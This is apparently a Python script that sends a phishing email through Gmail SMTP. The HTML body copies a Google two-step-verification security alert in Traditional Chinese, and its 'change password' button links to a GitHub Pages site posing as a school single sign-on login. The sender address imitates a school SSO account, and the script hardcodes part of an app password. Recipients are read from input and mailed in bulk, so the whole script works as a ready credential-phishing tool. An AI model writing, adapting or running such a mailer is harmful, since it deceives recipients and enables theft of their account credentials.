# send-email
```python
import getpass
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

class EmailSender:
    def __init__(self, email, app_password):
        """
        Initialize email sender with Gmail SMTP settings
        
        Args:
            email: Your Gmail address
            app_password: 16-character app password
        """
        self.email = email
        self.app_password = app_password
        self.smtp_server = "smtp.gmail.com"
        self.smtp_port = 587
    
    def send(self, recipient, subject, body):
        msg = MIMEMultipart()
        msg["From"] = self.email
        msg["To"] = recipient
        msg["Subject"] = subject

        msg.attach(MIMEText(body, "html", "utf-8"))
        
        try:
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls()
                server.login(self.email, self.app_password)
                server.send_message(msg)
            print(f"Email sent successfully to {recipient}")
            return True
        except Exception as e:
            print(f"Failed to send email: {e}")
            return False
    
def main():
    # Replace with your actual credentials
    YOUR_EMAIL = "hcc.sso.edu.tw@gmail.com"
    YOUR_APP_PASSWORD = "xgtv vnwl txzd " + getpass.getpass()
    
    # Create sender instance
    sender = EmailSender(YOUR_EMAIL, YOUR_APP_PASSWORD)
    
    for recipient in input().split(" "):
        html_content = """
<html>
    <body>
        <div class="ii gt" jslog="20277; u014N:xr6bB; 1:WyIjdGhyZWFkLWY6MTg2MTQ1MjAxMjk5NTIzNjI1NSJd; 4:WyIjbXNnLWY6MTg2MTQ1MjAxMjk5NTIzNjI1NSIsbnVsbCxudWxsLG51bGwsMywwLFsxLDAsMF0sMjQsMjgxLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCwxLG51bGwsbnVsbCxbM10sbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsMCwwLG51bGwsbnVsbCxudWxsLG51bGwsWzAsMV1d" id=":9p">
            <div class="a3s aiL msg8167393905606626642" id=":9o">
                <div id="avWBGd-20">
                    <u></u>
                    <div style="margin:0;padding:0" bgcolor="#FFFFFF">
                        <table width="100%" height="100%" style="min-width:348px" border="0" cellspacing="0" cellpadding="0" lang="en">
                            <tbody>
                                <tr height="32" style="height:32px">
                                    <td></td>
                                </tr>
                                <tr align="center">
                                    <td>
                                        <div>
                                            <div></div>
                                        </div>
                                        <table border="0" cellspacing="0" cellpadding="0" style="padding-bottom:20px;max-width:516px;min-width:220px">
                                            <tbody>
                                                <tr>
                                                    <td width="8" style="width:8px"></td>
                                                    <td>
                                                        <div style="border-style:solid;border-width:thin;border-color:#dadce0;border-radius:8px;padding:40px 20px" align="center" class="m_8167393905606626642mdv2rw">
                                                            <img src="https://ci3.googleusercontent.com/meips/ADKq_NZa00tQPIx4fdFGtuHSHzYQ-whZFD7HWD3OhXR05fT4XqJ_Wca2erL9R9_382bPBUom-sDOVfi4G3FXbYaZsHsGqQUAL6-JIKgEzWlarZbeNSLveyc6EKOURFQhphfzG2ZAwLiyrJsC=s0-d-e1-ft#https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png" width="74" height="24" aria-hidden="true" style="margin-bottom:16px" alt="Google" class="CToWUd" data-bit="iit">
                                                            <div style="font-family:'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif;border-bottom:thin solid #dadce0;color:rgba(0,0,0,0.87);line-height:32px;padding-bottom:24px;text-align:center;word-break:break-word">
                                                                <div style="font-size:24px">用於兩步驟驗證的電話號碼已新增</div>
                                                                <table align="center" style="margin-top:8px">
                                                                    <tbody>
                                                                        <tr style="line-height:normal">
                                                                            <td align="right" style="padding-right:8px">
                                                                                <img width="20" height="20" style="width:20px;height:20px;vertical-align:sub;border-radius:50%" src="https://lh3.googleusercontent.com/-Qiqq5NEGSMQ/AAAAAAAAAAI/AAAAAAAAAAA/ALKGfkne6uXfdrLISRPnXRhvt7oJo487bA/s48-c/photo.jpg" alt="" class="CToWUd" data-bit="iit">
                                                                            </td>
                                                                            <td>
                                                                                <a style="font-family:'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif;color:rgba(0,0,0,0.87);font-size:14px;line-height:20px">""" + recipient + """</a>
                                                                            </td>
                                                                        </tr>
                                                                    </tbody>
                                                                </table>
                                                            </div>
                                                            <div style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;font-size:14px;color:rgba(0,0,0,0.87);line-height:20px;padding-top:20px;text-align:left">
                                                                從現在起，系統會將用於登入帳戶的驗證碼傳送到新的電話號碼。如果您並未新增這個號碼，表示可能有人盜用了您的帳戶。請立即檢查帳戶並採取必要保護措施。
                                                                <div style="padding-top:32px;text-align:center">
                                                                    <a href="https://hcc-sso-edu-tw.github.io/hcc/saml" style="font-family:'Google Sans Flex','Google Sans Text','Google Sans','Noto Sans',Arial,Helvetica,sans-serif;line-height:16px;color:#ffffff;font-weight:500;text-decoration:none;font-size:14px;display:inline-block;padding:12px 24px;background-color:#0b57d0;border-radius:9999px;min-width:64px" target="_blank" data-saferedirecturl="https://hcc-sso-edu-tw.github.io/hcc/saml">更改密碼</a>
                                                                </div>
                                                            </div>
                                                            <div style="padding-top:20px;font-size:12px;line-height:16px;color:#5f6368;letter-spacing:0.3px;text-align:center">
                                                                您也可以前往以下網址查看帳戶安全相關活動：
                                                                <br>
                                                                <a href="https://myaccount.google.com/notifications" style="text-decoration:none;color:#4285f4" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://myaccount.google.com/notifications">
                                                                    https://myaccount.google.com/
                                                                    <wbr>
                                                                    notifications
                                                                </a>
                                                            </div>
                                                        </div>
                                                        <div style="text-align:left">
                                                            <div style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;color:rgba(0,0,0,0.54);font-size:11px;line-height:18px;padding-top:12px;text-align:center">
                                                                <div>您的 Google 帳戶和服務有重大異動，系統特此發送這封電子郵件通知您。</div>
                                                                <div style="direction:ltr">
                                                                    © 2026 Google LLC, 
                                                                    <a class="m_8167393905606626642afal" style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;color:rgba(0,0,0,0.54);font-size:11px;line-height:18px;padding-top:12px;text-align:center">1600 Amphitheatre Parkway, Mountain View, CA 94043, USA</a>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </td>
                                                    <td width="8" style="width:8px"></td>
                                                </tr>
                                            </tbody>
                                        </table>
                                    </td>
                                </tr>
                                <tr height="32" style="height:32px">
                                    <td></td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
            <div class="yj6qo"></div>
        </div>
    </body>
</html>
"""
        
        sender.send(
            recipient=recipient,
            subject="安全性快訊",
            body=html_content,
        )


if __name__ == "__main__":
    main()

```
